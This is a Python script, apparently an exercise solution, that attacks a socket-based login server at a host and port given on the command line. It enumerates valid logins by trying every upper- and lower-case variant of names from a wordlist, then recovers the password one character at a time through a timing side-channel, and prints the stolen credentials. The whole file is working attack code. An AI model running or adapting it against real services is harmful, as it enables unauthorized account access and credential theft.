import socket
import sys
import itertools
import os
import json
import time

symbols = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'


class Client:
    def __init__(self, address):
        self.socket = socket.socket()
        self.address = address

    def connect(self):
        self.socket.connect(self.address)

    def finding_login(self, login_path="logins.txt"):
        with open(login_path) as logins:
            for string in logins:
                iterator = itertools.product(
                    *([letter.lower(), letter.upper()] for letter in string[:-1]))
                login_list = map(lambda x: ''.join(x), iterator)
                for login in login_list:
                    message = {"login": login, "password": " "}
                    self.socket.send(json.dumps(message).encode())
                    response = self.socket.recv(1024)
                    if json.loads(response.decode()) == {"result": "Wrong password!"}:
                        return login
            return None

    def finding_password(self, login):
        password = ''
        i = 0
        while True:
            letter = symbols[i]
            password += letter
            message = {"login": login, "password": password}
            self.socket.send(json.dumps(message).encode())
            start = time.perf_counter()
            response = self.socket.recv(1024)
            stop = time.perf_counter()
            if json.loads(response.decode()) == {"result": "Connection success!"}:
                return password
            elif stop - start > 0.1:
                i = 0
            else:
                password = password[:-1]
                i += 1
            if len(password) > 10:
                return None

    def __del__(self):
        self.socket.close()


if __name__ == '__main__':
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    address = (hostname, port)
    # address = ('localhost', 9090)
    c = Client(address)
    c.connect()
    admin_login = c.finding_login(os.path.join(os.getcwd(), 'logins.txt'))
    admin_password = c.finding_password(admin_login)
    print(json.dumps({"login": admin_login, "password": admin_password}))
